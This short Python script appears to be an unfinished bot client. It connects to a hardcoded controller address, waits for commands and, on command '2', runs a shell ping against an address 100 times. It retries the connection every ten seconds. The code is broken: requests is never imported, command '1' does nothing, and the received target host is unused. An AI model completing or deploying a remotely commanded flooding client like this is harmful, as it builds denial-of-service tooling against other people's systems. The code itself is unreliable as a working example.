import os,  time, socket
IP_address = "192.168.1.10"
Port = 65222

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((IP_address, Port))

    while True:
        cmd = server.recv(1024).decode('UTF-8').strip()
        host = server.recv(1024).decode('UTF-8').strip()

        if cmd == '1':
            s = requests.session()
            for i in range(1):
                pass     
        elif cmd == '2':
            os.system("ping %s -c 100"%IP_address)      

if __name__=="__main__":
    while True:
        time.sleep(10)
        main()
        
  
